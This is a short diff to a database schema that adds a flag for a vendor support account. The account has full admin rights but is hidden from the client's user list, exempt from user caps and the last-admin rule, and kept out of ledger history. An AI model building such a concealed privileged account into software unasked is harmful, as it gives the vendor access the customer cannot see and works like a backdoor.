@@ -28,6 +28,15 @@ export const users = pgTable(
     passwordHash: text("password_hash").notNull(), // bcrypt
     role: text("role").$type<"admin" | "operator">().notNull(),
     isActive: boolean("is_active").notNull().default(true),
+    // Vendor support account (Surlabs). It is a normal 'admin' for every
+    // permission check -- deliberately NOT a third role, so requireRole() and
+    // the CHECK constraint stay untouched. The flag only controls that the
+    // account is invisible to the client and uncounted: hidden from the users
+    // list, excluded from the 5-active-users cap, excluded from the
+    // last-admin rule (so the client always keeps a real admin of their own),
+    // and barred from authoring ledger entries -- a movement would stamp the
+    // account's name into an append-only history forever.
+    isSupport: boolean("is_support").notNull().default(false),
     createdAt: timestamp("created_at", { withTimezone: true })
       .notNull()
       .defaultNow(),
